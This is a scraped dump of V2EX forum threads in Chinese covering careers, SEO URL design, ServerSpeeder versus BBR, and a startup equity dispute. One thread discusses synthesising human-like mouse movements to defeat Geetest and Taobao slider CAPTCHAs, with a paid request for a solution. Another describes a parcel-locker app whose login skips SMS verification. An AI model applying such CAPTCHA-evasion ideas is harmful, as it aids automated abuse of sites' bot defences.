源码为准，又不是要你增加一个值，立马就去线上把表结构的注释给改了。再说了，你家的系统任何时候都不停机的吗，这不可能好吧，总有维护的时候", " 除了 IDC 停了一次电，没有停过机", " 就是没有合理的自动化展示方式才觉得头疼", " 我不知道你的公司规模有多大，我的经验，要想可视化文档展示，又要保证展示的东西和实际开发的代码逻辑是一致的，这是要付出代价的，它需要你有专门的人力来维护并沟通一线开发者。项目组不够人多的话你这么玩精力上玩不过来的。"]},
{"content": "", "reply": "5", "tittle": "有没有 shell 练手的题目", "comment": ["把你现在要做的事全部用 shell 做不就行了", "做一个无限级的父子菜单。代码尽可能控制在 100 行左右。\r", "如：\r", "1.动物\r", "2.植物\r", "。。。\r", "输入： 1 ，\r", "进入另一页，出现：\r", "1.猫科\r", "2.犬科\r", "....\r", "然后以此类推到最后。\r", "同时，如果输入某个字母或者数字，比如 q ，则返回上级，一直按一直返，直到最顶级.", " leetcode 的 shell 题", "hackerrank 也有 shell 的題目", "能不能写个自动抢美团霸王餐的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>12 年毕业做了 2 <a href=\"http://%E5%B9%B4.NET\" rel=\"nofollow\">年.NET</a> ，<a href=\"http://%E5%9B%A0%E4%B8%BA%E4%B8%8D%E5%96%9C%E6%AC%A2.NET\" rel=\"nofollow\">因为不喜欢.NET</a> 封闭，转了 iOS ，至今做 2 年多 iOS 。水平一般薪资不高 base 深圳 20k 。</p>\n<p>原本打算继续深耕 iOS ，现在有一个机会做大数据（待遇不变，直接入职，公司主要做政务大数据），从头开始学。</p>\n<p>大数据方向现在看前景不错，我的疑问是：</p>\n<p>1 、会不会过热然后恢复平静？</p>\n<p>2 、这样转会不会跨度太大？学习路径大概要多长时间？</p>\n<p>谢谢。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "iOS 应该转大数据吗？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.v2ex.com/t/342626#reply0\" rel=\"nofollow\">https://www.v2ex.com/t/342626#reply0</a>\n之前发了一条技术问题贴 因为是萌新选错了节点。请大人们移驾。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[前端] 关于爬虫与 Facebook", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看这两张图吧\n<img alt=\"1\" src=\"https://ooo.0o0.ooo/2017/02/23/58aea4acd602b.png\">\n<img alt=\"2\" src=\"https://ooo.0o0.ooo/2017/02/23/58aea4ace652b.png\"></p>\n<hr>\n<p>大家都懂得</p>\n<h1>韩是老公司的股东</h1>\n<h1>CEO早就另起炉灶了 呵呵</h1>\n</div></div>"], "reply": "1", "tittle": "关于：就算老公一毛钱股份都没拿到，在我心里，他依然是最牛逼的创业者", "comment": ["股东？"]},
{"content": ["<div class=\"topic_content\">这个锅好像是 cloudflare 的</div>"], "reply": "3", "tittle": "1password 密码泄露，请尽快修改", "comment": ["> 1Password does not depend on the secrecy of SSL/TLS for your security. The security of your 1Password data remains safe and solid.\r", "\r", "说的那么吓人...", " 原来如此 多谢多谢\r", " 我也是听别人说的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>你们可以打开吗？\n<a href=\"http://serverspeeder.com/\" rel=\"nofollow\">http://serverspeeder.com/</a></p>\n</div></div>"], "reply": "19", "tittle": "锐速的官网怎么打不开？", "comment": ["早就和谐了。", "硬盘坏了，数据丢了，不做了 ", " ", "不是说破产了吗？", " 只是现在不做个人客户的生意罢了\r", "企业客户那边还在的。\r", "网上不是有一键安装的破解么", "github 91yun.....", "  村通网了", "  大清亡了", " 4.9 的内核不支持。。。", "有 bbr 了，更简单。", " 4.9 直接上 bbr 啊，比锐速不知道高到哪里去了", " 牛逼", " 牛逼", " 牛逼", " bbr 比锐速要快吗？", "bbr 实测比 锐速好用 但是 bbr 到某一个点 速度会一下为 0  过几秒就好了", " 请教 bbr 是啥？", "实测， BBR 后最低值，最大值均不如锐速，已改回"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>鼠标移动产生的轨迹数据格式如下：</p>\n<p>(x 轴上相对上一个点的位移， y 轴位移，当前像素停留的时间)</p>\n<pre><code>x1, y1, t1\nx2, y2, t2\nx3, y3, t3\nxn, yn, tn\n</code></pre>\n<p>表示从(x1,y1 ）开始移动到(xn, yn)。</p>\n<p>第一个点有点特殊，表示当前鼠标的位置。\n从第二个点开始， x 表示的是在上一个点的基础上移动的像素。示例数据如下：</p>\n<p>表示从坐标(30, 20 ）开始移动的。 X 和 Y 都平滑平稳，但是 t 需要有人的行为，比如加速度，刚开始可能比较慢，中间快，最后要到目标位置了又慢下来了。</p>\n<p>欢迎大家讨论</p>\n<pre><code>30,20,0\n1,0,443\n1,0,21\n1,0,6\n1,0,3\n1,0,7\n1,0,3\n1,0,7\n1,0,2\n2,-1,13\n1,0,7\n1,0,5\n1,0,5\n1,0,6\n1,0,5\n1,0,5\n1,0,4\n1,0,6\n1,0,6\n1,0,10\n1,0,11\n1,0,8\n1,0,11\n1,0,5\n1,0,9\n1,0,10\n1,0,10\n1,0,12\n1,0,9\n0,-1,3\n1,0,19\n1,0,26\n1,0,17\n1,0,8\n1,0,5\n1,0,10\n1,0,10\n1,0,8\n1,0,12\n1,0,9\n1,0,10\n1,0,9\n1,0,9\n1,0,9\n1,0,3\n1,0,5\n1,0,3\n1,0,6\n1,0,6\n1,0,6\n1,0,8\n1,0,6\n1,0,10\n1,0,3\n1,0,10\n1,0,5\n1,-1,7\n1,0,5\n1,0,7\n1,0,5\n1,0,7\n1,0,11\n1,0,9\n1,0,23\n1,0,17\n1,0,11\n1,0,10\n1,0,7\n1,0,7\n1,0,7\n1,0,4\n1,0,2\n1,0,8\n1,0,1\n1,0,3\n1,0,3\n1,0,3\n1,0,4\n1,0,2\n1,0,3\n1,0,3\n1,0,6\n1,0,7\n1,0,1\n1,0,3\n1,0,5\n1,0,3\n1,0,3\n1,0,4\n1,0,2\n1,0,7\n1,0,2\n1,0,5\n1,0,4\n1,0,6\n1,0,6\n1,0,6\n1,0,7\n1,0,9\n1,0,7\n1,0,4\n1,0,9\n1,0,8\n1,0,5\n0,1,6\n1,0,10\n1,0,7\n1,0,9\n1,0,4\n1,0,6\n1,0,4\n1,0,5\n1,0,4\n1,0,3\n1,0,2\n1,0,2\n1,0,3\n1,0,2\n1,0,3\n1,0,2\n1,0,3\n1,0,3\n1,0,3\n1,0,2\n1,0,2\n1,0,3\n1,0,3\n1,0,5\n2,0,10\n1,0,2\n1,0,4\n1,0,6\n1,0,6\n1,0,11\n1,0,7\n1,0,17\n1,0,29\n0,1,41\n1,0,11\n1,0,43\n1,0,123\n1,0,15\n1,0,13\n1,1,79\n1,0,12\n1,0,51\n1,0,9\n1,0,3\n1,0,22\n0,0,807\n\n</code></pre>\n</div></div>"], "reply": "19", "tittle": "如何模拟人移动鼠标产生的的轨迹？", "comment": ["需要考虑 位移 抖动 加速度 随机值", "应该可以做出来吧\r", "\r", "有位置和停留时间，就可以得到以时间为变量的参数方程\r", "\r", "速度加速度不用考虑的，因为参数方程中都包含这些信息了", " 恩，拉动就是 Y 上面的变化，加速度体现在 T 的值。一小段内位移每个点的 T 值还不是平滑的。\r", "\r", " 我上面的轨迹只是一个例子而已，现实是要根据这些特征自动生成轨迹", "是否可以 将人工移动的鼠标轨迹录制成片段，然后从库里面随机播放一段呢？", "又有人要开刷极验了？", "随机曲线吧，", "新来的悄悄问句淘宝的验证有人搞定了么？是不是跟极验一个套路的？", "没有限制的话，机器学习呗", "就算轨迹模型可以做出来，但是 webdriver 的执行和代码的执行貌似不是同步的。\r", "代码上设定两点间歌 0.5 秒， webdriver 执行的间隔可能是 1 秒。", " 录制的使用一定的次数就会被识别出来，因为无论如何组合都会有重复的片段，会被识别出来。\r", "\r", "   哈哈，讨论一下如何？\r", "\r", " 我正在考虑机器学习，没有这方面的基础，感觉无从下手。", "人工录几段鼠标移动的(x 轴， y 轴，微秒级时间轴) 丢到 机器学习里训练？再 加点 随机扰动？", " 我们的想法差不多的，能加 QQ 聊聊吗？", "  我是菜菜了。主要搞编译器的。这方面懂得不多", "极验都玩烂了还玩。。而且已经有成熟的解决方案，想自己本地玩玩的话，一是模拟模型（生成固定）跑个几天就会被极验拉黑，二是同 IP 请求到一定程度也拉黑。", " 加一下 QQ562623566 ，有偿寻解决方案", "我没理解错的话应该是一个匀减速运动，可以写一个坐标方程，然后将起点带入配合时间算出每时刻的坐标点", "  谷歌的也可以破解吗 ：）", "用 Autoit MouseMove()。默认匀速，可以加入几个中间点近似一下变速", "机器学习，多取些样本，然后模拟"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以 stackoveflow 为例，它的问题列表是： <a href=\"http://stackoverflow.com/questions\" rel=\"nofollow\">http://stackoverflow.com/questions</a></p>\n<p>现在在它的问题列表下的一个问题是这种 URL 结构：</p>\n<p><a href=\"http://stackoverflow.com/questions/42406362/how-to-check-for-inclusion-of-multisets\" rel=\"nofollow\">http://stackoverflow.com/questions/42406362/how-to-check-for-inclusion-of-multisets</a></p>\n<p>理论上来说，最佳的 URL 结构应该是：</p>\n<p><a href=\"http://stackoverflow.com/questions/how-to-check-for-inclusion-of-multisets\" rel=\"nofollow\">http://stackoverflow.com/questions/how-to-check-for-inclusion-of-multisets</a></p>\n<p>这样就能突出 URL 目录的依次归属关系，也许数据表中“ how-to-check-for-inclusion-of-multisets ”来查询效率太低吧，所以他增加了一个 id 来传参： <a href=\"http://stackoverflow.com/questions/42406362/how-to-check-for-inclusion-of-multisets\" rel=\"nofollow\">http://stackoverflow.com/questions/42406362/how-to-check-for-inclusion-of-multisets</a> ，这样做的好处是增加了查询效率，坏处就是把 URL 结构的依次归属关系打乱了，而且增加了目录层次，那么从 Google SEO 的角度，下面哪种 URL 设计最好喃？</p>\n<ol>\n<li><a href=\"http://stackoverflow.com/questions/42406362/how-to-check-for-inclusion-of-multisets\" rel=\"nofollow\">http://stackoverflow.com/questions/42406362/how-to-check-for-inclusion-of-multisets</a></li>\n<li><a href=\"http://stackoverflow.com/questions/42406362-how-to-check-for-inclusion-of-multisets\" rel=\"nofollow\">http://stackoverflow.com/questions/42406362-how-to-check-for-inclusion-of-multisets</a></li>\n<li><a href=\"http://stackoverflow.com/questions/how-to-check-for-inclusion-of-multisets-42406362\" rel=\"nofollow\">http://stackoverflow.com/questions/how-to-check-for-inclusion-of-multisets-42406362</a></li>\n<li><a href=\"http://stackoverflow.com/questions/how-to-check-for-inclusion-of-multisets/42406362\" rel=\"nofollow\">http://stackoverflow.com/questions/how-to-check-for-inclusion-of-multisets/42406362</a></li>\n</ol>\n<p>如果上述方式都不好，怎样快速在 MySQL 中查询“ how-to-check-for-inclusion-of-multisets ”？</p>\n</div></div>"], "reply": "23", "tittle": "从 SEO 角度，网址中的查询 id 结构怎么设计才最好？", "comment": ["全文索引。", "从 SEO 的角度,肯定是 3 但是可行性太低,问题太多.", " 全文索引感觉非常不合适", "     quora 就是不带 ID 的，就看技术实力了。\r", " 但万一问题重复了咋办？", "如果你纠结的话，选 2 ，平衡了技术难度和 URL 结构", " \r", "quora 运营来处理，我记得他们还发起了一个利用深度学习判断两个问题是不是重复的项目。\r", "技术上来说直接不允许两个完全一样的题目被创建就好。", " 那个是可以设置成人工指定的，参考 Typecho 博客撰写文章功能", " 但对于数据条目多的就麻烦了", "参考亚马逊做法即可。\r", "canonical 标签\r", "<link rel=\"canonical\" href=\"https://www.amazon.cn/%E7%94%B5%E8%84%91-it-%E5%8A%9E%E5%85%AC/dp/B01I88B8F6\" />\r", "含关键词。\r", "\r", "但用户访问时 ", " 即可。", " \r", "我觉得两个社区性质有一些不一样. sf 注重的是这个问题怎么解决,相对而言是有所谓的正确答案,关闭后就没有继续回答的必要了. quora 和 zhihu 之类的更偏重在你对这个问题的看法是什么样的,并不是一定有正确答案,即使有高票答案之后你也可以来分享你的见解.\r", "\r", "两个完全一样的题目怎么去处理的方法导致最后 url 结果也不尽相同.", "我是这么设计的 ", "\r", "\r", "分类 /页面名.html", "单纯只是给搜索引擎看的话， 我个人觉得 url 有没有文本不重要。 因为你的页面里肯定包含了这些内容。", "直接拿 title 查可能会拖慢查询速度吧", "查询的话，数据库可以存储一下 URL 中标题的 md5 或者 sha1 就行了。这样查询跟用 ID 查询没太大区别了吧。", "其实楼主你关于 StackOverflow 的猜测完全弄错了。你可以试试这个 URL ：\r", "\r", "\r", "和你直接访问 ", " 的结果是一样的。\r", "\r", "从系统设计的角度来说， URL 本身就应该是 questions/42406362 ，后面的 Slug 只是为了 SEO 而已。", "除非是自己的 cms ，不然总得带个 id", " 搞得好像 md5 sha1 不是 string 一样", " #18 md5, sha1 不是 string ，是 128bit / 160bit integer", " 对啊，我也是这个意思啊，就是不知道怎样安排这个 id 值", " 不，我的意思是说那段 Slug 完全不是数据库索引的一部分，可能只是取出数据之后做了一下比较而已。\r", "\r", "另外，只用 Slug 来确定数据项的话，用在 Blog 这样数据量小的系统上确实问题不大，但是像 StackOverflow 这样的系统而言，可能会遇到重复的问题。\r", "\r", "最后，如果说上面 4 个 URL 中哪一个最好，按照我个人的经验应该是 3 。因为 URL 的中有 SEO 意义部分都在最前面，而且 /符号比较少。\r", "\r", "不过我的知识是基于很多年前的经验，不知道现在还是否适用。", "内个，搜索引擎不只是爬你的 url 呀\r", "实际上 url 多糟糕也会先爬取一下内容再决定是否索引的", "seo 不是规则，是经验"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://mp.weixin.qq.com/s?__biz=MzU1ODAwODc5Mw==&amp;mid=2247483652&amp;idx=1&amp;sn=f39a27882b094d88d658e0fa8a535f2f&amp;chksm=fc2c51b2cb5bd8a4731a13a255f4ce91c30765491ef6a0d3e307b5d08521decbaa8857e8c0c1#rd\" rel=\"nofollow\">http://mp.weixin.qq.com/s?__biz=MzU1ODAwODc5Mw==&amp;mid=2247483652&amp;idx=1&amp;sn=f39a27882b094d88d658e0fa8a535f2f&amp;chksm=fc2c51b2cb5bd8a4731a13a255f4ce91c30765491ef6a0d3e307b5d08521decbaa8857e8c0c1#rd</a></p>\n</div></div>"], "reply": "1", "tittle": "作为曾经一起北漂过的程序员谈谈《就算老公一毛钱股份都没拿到，在我心里，他依然是最牛逼的创业者》", "comment": ["程序员就应该变聪明点。"]},
{"content": ["<div class=\"topic_content\">今天才想起有个域名需要续费，就赶紧上去续费了。点开订单选择广发信用卡支付之后返回发现没有反应。就很尴尬了，域名 25 号就过期了。工单的处理时间要到星期一。\r<br>\r<br>我是不是姿势不对应该用支付宝亲儿子啊。</div>"], "reply": "1", "tittle": "阿里云这个续费系统有毒，支付了没有反应", "comment": ["再支付一个然后等退款"]},
{"content": ["<div class=\"topic_content\">小区有快递柜，快递直接放在快递柜里了，给我发了条短信，下载 APP 查看取件码取快递。心里很不爽，为了流量，这公司竟然这么搞。为了取快递，还是忍着不爽下载了。打开 APP 界面，要求输入手机号获取验证码。因为楼主项目组是二手车贷款方面的的，风控给了的逻辑非常复杂的聚信立授权功能，正好是我做前端，一时兴起想试试这个 APP 做的咋样，有啥缺陷没有。接着楼主输入手机号，然后没有输入验证码，直接按登录，竟然成功了！！！\r<br>         登进去之后可以看到用户的收货地址等一些信息，这信息就这么泄露了。不知道这个 APP 登录界面是原生的还是 H5 的，这也罢了，测试竟然也测不出来。我在想，国内互联网靠什么保证安全，大量培训出来的进入了这个领域，质量参差不齐。到底要靠什么甄别水平，谁来保证我们的信息安全。现在的安全状况，只能一声叹息而已。</div>", "<div class=\"topic_content\">别问我啥 APP ，打死都不会说的</div>"], "reply": "52", "tittle": "国内的互联网，用什么保证你的安全", "comment": ["就是输入别人的手机号也能进？", " 是的，太不靠谱了，住的近的话，东西都会被别人取走。希望快递柜的监控管用。", "所以最好的方法就是能不用尽量不用～ 现在一个星期都很少打开一次支付婊了～", "只能说坑逼「程序员」太多了……", " 我也好久没用过了，上次手机刷了安卓 6.0 后，竟然不知道一直没装支付宝，直到这个月自如要交房租了。。", "会不会是， app 读取到了你的手机号码，和你输入的号码一致，所以就算是验证通过了。也有可能 app 获取了读取短信的权限，在后台悄悄地读取了验证码的短信。", " 我还没收到短信的时候，就点了登录按钮。而且我用的小米 4 ，禁止了 app 获取这些权限。", "淘宝买的东西，放快递柜可以拒收的。", " 这样子啊。。年会的时候，公司要求穿带点红色的衣服什么的，天猫买了件粉红色衬衫，早知道这样就拒收了。同事说我穿着粉色衬衫像个基佬。。", " 以网页淘宝为例，“查看物流”的界面右上角有个投诉，里面就有未经允许放进快递柜的。收货了也可以投诉。\r", "倒不是不体谅快递员，像我这种 Google Play 洁癖让我下那种 App 而不是只用微信 /短信就能搞定的，我会疯的", "难道是速递易?", "我一直好奇，穷举取件码能不能打开。", "  哪个 app 啊，回头试一下。", " 别在这地方猜，让你猜到了，公司没准跟你打官司了", "你觉得哪个国家的互联网，能保证你的安全？", "不要什么不如意都责怪行业责怪社会。", "换一个心态 或许对你有帮助。", " 听大佬的", "近邻宝？", "建议对标题党执行降权处罚", "这么说我觉得不合适吧，好比房子能保证你的安全么？但你睡在天桥下面和房间里的安全感是一样的么？不能一句“哪个国家的互联网能保证你的安全”来带过，隐私获取成本不一样，结果是完全不一样的。\r", "国内的 app 环境就和天桥下面睡觉一个感觉。响应国家实名制，动不动要你的身份证号，手机号，但这些小公司真的有能力保证这些信息的隐私么？他们自己不作恶我都觉得谢谢他祖宗了。\r", "这些钓鱼的，诈骗的，哪怕获取我们信息的成本多一点点，这些人渣都会少不少吧？\r", "我现在甚至连手机通信录都用自己写的，仅仅只是为了不让 app 获取我联系人的电话，减少垃圾短信，但依然还是拦不住。每次收到推销，诈骗电话，都尽可能的去举报，虽然个人可能力量比较微薄，但总还是要做出点行动的。", "只能说你小区的这个太垃圾了，蜂巢什么的都是会给手机发个取件码，不下载 app 也能取件的，不知道你说的哪家垃圾快递柜", "e 乐活？", "我们小区俩蜂巢和格格都是发取货吗的短信，不用下 app\r", "另：不知道他们怎么赚钱的。。。", " 是啊，确实要做出行动", " \r", " 我也觉得蜂巢挺不错的 感觉赚的应该是快递公司的钱，另外寄件的话也能赚钱吧", " \r", "安卓 6.0 以下禁止了貌似没多大用,有些还能获取的.告诉我你是哪个版本的安卓?", " 淘宝的订单页面有个“物流投诉”按钮，点击以后第一个投诉选项就是“未经允许放入快递柜”。我之前投诉过，当天快递员就回去快递柜取件，再投递了。", " 按件分成， 从快递员收入那里扣 1 ， 2 毛钱。", "一个社会最终的救济是司法。这个么你懂的......\r", "国内互联网生态最流氓的地方还不是安全和隐私保护差，而是完全不允许用户退出并删除自己的个人信息。\r", "请问有人见过“删除帐号”这种按钮么？", "用了互联网就会不安全啊。隐私泄露是早晚的事。", "美帝一般的做法是电话也不打，扔你家门口……", " 国外一般不会直接打别人的私人电话，除非是很好的朋友或者很紧急的事，不然就是骚扰了。文化差别而已。", "之前也被各种骚扰电话困扰，其实现在也是，所以索性把微博，百度等上面的电话全部移除，骚扰量减少了很多，之前百度有把我的资料卖给第三方金融公司，“先生有需要贷款吗”，“先生我最近看你浏览了 xx 网站...”，后来有开了个号做备用，一声叹息啊", " #33 其实并不，我就遇到过负责人电话通知预约送货时间的快递员，也见过门铃都不按直接扔门口的快递员。\r", "出了问题都是网购平台承担损失，所以我估计大家也都不介意。", " 是的！ 直接堆门口", "速递易是要输入密码才能登陆的。", "明显是产品设计有问题啊，这个锅程序员不背。。", "有些便民店有些快递，就堆门口，便民店也不怎么管，取快递完全是靠自觉，靠自觉！！\r", "\r", "取快递不用验证码什么的，不用交钱之类的。帮朋友去过两次这种快递，感觉拿走别人的快递挺容易的。", "遇到过，好像是日日顺吧", " 那应该是挂号要签字的，或者地址弄脏了\r", "在美帝买了这么多从来都是扔在门口，有一次一个 boss 降噪耳机因为快递延迟，没赶上我出去旅游，硬是在家门口躺了至少 8 天。\r", "美帝就是这样，暴力犯罪比国内多 n 倍，偷东西还真的比国内少 n 倍。。拿着枪就为了抢你钱买鸡块解决今天吃饭，因为一般人钱包里也没多少钱。。。。很久之前被一个人黑人拦下问我带来多少钱，看我钱包里 30 块钱和 100 元新台币问我能不能给他 20 （我还没回答就直接拿走了，然后翻了翻把台币 100 也拿走了），说给我留 10 块打车，也不知道这算不算抢劫。。", "土澳一般的做法是电话也不打，扔你家门口……除了 DHL ／ stacktrack 等等贵的快递公司", "这事不能怪程序员，要怪就要行业的安全不重视。有多少公司会有测试？大部分中小企业是能省测试就省。最后项目出问题了，背锅肯定是开发。\r", "做安全的有这么一句话：如果程序没漏洞，就没我们的事。", "可惜现在乌云关了也没地方提漏洞了。", " 唉， wooyun 关了对很多人来说很伤", "速递易刚开始推他们电商时不发取件短信必须安 app 后来估计架不住 1 星评价 又开始发短信了", " cncert🙃", " 豆瓣好像还真有“删除账号”", "可以关闭的互联网服务,想到的只有腾讯微博\r", "还有别家的吗?", " 人人网很早就有注销账号功能，我注销几年了，虽然这个煞笔大街网年年给我发邮件，我打电话给他们客服要求删除我的信息。（起码不再发邮件了）\r", "某一次朋友要帮忙抢小米，我拿手机号注册的小米账号，没抢到，直接联系的客服询问的注销方法。\r", "一般大一些的服务都有注销功能，你自己也要去找一下的。", " 它会删除你发的信息么？有些网站也有类似关闭帐号，比如以前的开心网，但是那个只能关闭帐号，不能删除帐号。\r", "遇到过最流氓的是某个挂号网站，以前年幼无知提交过实名信息。后来觉得很多医疗方面信息有被泄漏的风险不太好，要求删除帐号，这斯客服居然拒绝......\r", "总体来说，国内互联网公司大多打着“免费”的旗号。客户都是上船容易，下船难。真用过之后就会明白：如果一件商品免费，那么你本身就是这个商品的价格。", "我们这边是用的邮政的易邮柜，会有取件码的短信通知。还可以绑定微信帐号。但是都不需要下载什么 App 。不知道你们那儿是用的什么，感觉好坑。"]},
{"content": "", "reply": "67", "tittle": "运维和编程目前哪个有前途", "comment": ["运维", "显然是编程啊", "同问", "这里有两种新闻:\r", "运维删主库\r", "程序员猝死", "devops", "运维很被动，多数情况下无权进行技术选型。", "运维开发", "在这两个里面非要二选一恐怕太笼统了，还要看具体是做什么的", "难道这个不是看自己爱好吗？", "运维工作不好找啊", "两项工作又不冲突，两者重合的地方那么多 (→_→)", "突然想起曾经被人说过我司以前一个运维调到新浪再到国美成开发总监的事...", "运维主动性很高的，关键要看你会不会怼", "nb 的运维 秒杀码农啊。", " #14 此话怎讲？", "对，开发其实是被动的，运维如果会说，主动得很，一句出了事不管，领导都怕。", " 好的运维更难找到。比较稀少。当然，都到顶级了，两者差不多。", "一句出了事不管，领导都怕+1", "没有不会开发的顶级运维，也没有不懂运维的顶级开发。做 client 端那另说。", "会编程的运维 或者 会做运维的程序员", "devops 运维+编程", "问出这个问题感觉楼主未来成就有限，就别按细分行业去走了，还是踏踏实实完善技能树吧", "编程可以自己玩，玩到死。", "我觉得主要看你的对手的能力吧，参考我最近的那个帖子", "随着云计算的普及，专职运维的岗位坑越来越少了。而且有编程能力的运维（ devops ）会更吃香。哪个更有前途不言而喻", "运维是服务性工作=被玩。", "一般不是开发比运维待遇更高吗？", "运维要 365 天 24 小时轮班，编程最多只要加班。", "运维會寫 bash 和 python 很吃香的", "以后公司都上云了，可能运维这个职位招的都越来越少了。", " 总的来说是减少，但这些云服务商招的运维要增多了。", "牛逼的运维真的秒杀码农好不。。", "牛逼的运维确实秒杀码农呀", "牛逼的人做什么都秒杀 XX", "devops", "devops 能运维, 能开发", "我是一个干了 5 年的运维，去年离职了，谈谈这几年的感想吧。", "因为在进入运维岗前，自己是在中国电信工作。装过 ADSL 、小区宽带，也跟着前辈们去修过电话亭，接过光缆，甚至还检修并更换过某一条路的几十个井盖(-_^)，在这种自以为有点经验和知识，并怀着对互联网行业的些许憧憬的情况下，遂来到了成都一家 idc 公司入职。", "当然 first of all ， idc 运维和电信业务和编程都是不同的，不过都依赖电信运营商的网络和基础设施。入职的时候挺顺利：我讲到有在电信工作的经验，会安装维护系统（当然不包括 linux ），了解计算机软硬件会装机（台式机当然不是服务器了，不过后来也知道差别不大），懂一点 html ，并且喜爱这一行。 hr 问我能不能接受外派到异地机房工作，我说“行”然后我就是公司运维部的人了，从此运维生涯开启(´▽｀)。", "入职后我在公司待的时间不长，就飞去了浙江嘉兴的电信机房（共待过浙江嘉兴机房，河南景安机房，一小段时间成都的两个机房）。上班的第一天运维的主管就来教我 diy 服务器的安装（为什么是 diy 呢？因为省钱啊，自然硬件的维护也落在了驻地运维的身上…坑也由此开始），硬件装好后点亮开机就接着安装 centos ，幸好我英文还行安装过程都能看得懂，所以大致就这样过了一遍系统的 install （分区的地方确实没弄很懂，因为 linux 毕竟和 win 系统的文件结构差别蛮大，然后公司 freebsd 也用的挺多，当时完全还没有讲到 freebsd ，又一个大坑奠定(-_^)），进系统后学了几个简单的命令： setup, top, df -h, reboot ，自此，在公司的时间全部结束，天高任鸟飞，海阔凭鱼跃，山高皇帝远的驻地运维工作正式拉开序幕。", "不知不觉文章就这么长，只能有时间再续了。从上面这么多文字来说，运维这个工作需要你对不同的硬件软件都有可以掌控的认识，懂得系统配置（至少网络得配通能远程），有一套网络测速的方法，可能会有很多的加班（比如半夜出了故障）。但我想，选择工作最重要的还是 follow your heart 吧，循序渐进。", "DevOps 是趋势吗", "想想为啥叫 DevOps 而不是 OpsDev 就知道了", "难道不是开发吗？因为云的出现，对运维的水平要求会更高，如果你跟不上，死得快。。", " 哪里吃香了。。。求 offer 。。。 30 左右就好。。。", "有前途么，肯定是开发，但是运维也不差", "有没有前途，主要还是看人。", "最好都会一点\r", "哪个目前机会更好先做哪一个", " 这也行……", "程序如果出现 bug ，运维问开发尽快解决，开发一般都会说不应该啊。\r", "每次升级后，都是运维人员背地里骂开发最多最频繁的时候。", " 外企运维 /IT 权利不是一般的大，对于技术选型有一票否决权，而且解释只有一条 “不安全”。", "你能把哪个做好了，哪个对你来说就有 qian 途。", "编程工资高！", "编程，我是运维", "这个绝对要看具体情况啊！可以说都有前途，也能说都没有前途。\r", "我是运维。", "编程，我是运维+1", "从运维转开发的飘过", "如果你问钱途，显然是开发——你想老板会认为开发和运维哪个重要？老板当然会给核心岗位更多的钱", " ", "  ,,In depth knowledge & experience of Linux.,, Some knowledge of scripting/programming with Perl and Python.", " 居然还真是挺适合我的…！射射", "编程，我是运维+2", "都有前途~但没有钱途", "在学 java,能搞些 python 的屌丝运维, 让我说,很多时候 普通开发深度够,广度不够，运维则相反,但再往上应该差不多,但还是会更有偏重。", "完全凭兴趣，不过趋势是运维必须会开发", "基础＋编程能力（开发）＋意识（运维） 第一个是主要的，第二个第三个全有或者任选其一即可。不过， 选哪个真的不重要 有精力看看软技能也比纠结选哪个强。", "我接触到的专家级别的运维，简直对他膜拜得不要不要的，从网络走线、配 vlan 、配交换机，到装系统、装数据库、打通网络，再到搭建 Hadoop 环境、配置 HA 、配置监控、数据迁移、集群维护、架构设计等等，简直就像流水线作业，嗯，人家与公司签的是终身制合同，怕的就是他跳槽", "开发好提升啊，代码一大堆开源的，看不看得懂只要自己努力就好了。\r", "\r", "运维那一大票设备，你自己在家里有机会整？小公司运维一辈子可能都玩不到很多设备，你想实战都没门，你说要怎么提高经验水平？", "Reference to: ", " 随意在云计算提供商工作的必须是专职的运维拉", " 这个还只是高级，到不了专家。我遇到的一个专家，不仅能做你说的那些，自己把 bash 源代码拿下来改，改成自己顺手的 shell 放在上千台机器上运行一点问题都没有；还有一位，波兰人，数学强得一塌糊涂， c 程序写得比开发还麻利。有一次说一个 case （关于 pipe line 建设细节的），一屋子美国 /德国 /中国（也就是我）的“资深”“高级”们，一个个大眼瞪小眼，愣是没听懂人家的思路，后来做着做着才反应过来人家说什么，当然了，掉坑里了。这人是 RedHat 代码核心贡献者之一。", " 近朱者赤，能近距离接触这么多的牛人，厉害"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://maimai.cn/article/detail?fid=88204799&amp;from=headline&amp;share_user=http%3A%2F%2Fi9.taou.com%2Fmaimai%2Fp%2F1146%2F8856_105_K75Mn35sGPVdpN-a160%20%E9%82%A3%E4%B8%AA%E5%85%AC%E5%8F%B8%E7%9A%84CEO%E5%9B%9E%E5%BA%94%E4%BA%86\" rel=\"nofollow\">ceo 终于回应了,这情商也太让人着急了,撕逼肯定越来越烈了!</a></p>\n</div></div>"], "reply": "20", "tittle": "[ceo 回应] 就算老公一毛钱股份都没拿到，在我心里，他依然是最牛逼的创业者", "comment": ["下边写着虚构了，一大早这篇就出来了。", "看来大家都是看热闹不嫌事大，哈哈哈哈哈", "这个 CEO 够牛逼\r", "\r", "1 、侮辱人。\r", "2 、破坏他人家庭团结。\r", "3 、破坏他人婚姻 - -！\r", "\r", "\r", "\r", "哈哈\r", "\r", "素质堪忧。\r", "七年了，不算创业公司了吧。\r", "\r", "这时候还一副毒妇脸真的好吗", "下面写着纯属虚构，这个热点蹭得有点恶心！", "难道就我好奇这个人是怎么活到现在的？", "之前就有个帖子发了 这个文章明显蹭热点....给自己刷流量和关注...恶心", "觉得有点假，不像是当事公司 ceo 回应的。", "假的吧", "明显蹭热点", "搬来小板凳 坐等撕逼", "这也太假了吧", "翻译\r", "1)你本来就是靠创业来忽悠老婆的，我靠股权忽悠你有问题？\r", "2 ）你作为忽悠进来的老二，其实除了帮我廉价写点代码外，根本不重要。\r", "3 ）造成今天这个局面，不止是我一个人坑你的，还有董事会，当然了股权嘛，我压根没把你算在里面。", "别走开，广告之后更加精彩…", "  ORZ", "我支持 CEO ，这写得太有道理了。\r", "搬砖的就老老实实的搬砖，要这要那的，凭什么？\r", "我就很好奇了，我广大农民工在工地上累死累活的，冒着生命危险的干活儿。怎么就没有去找开发商和投资人要股份？", 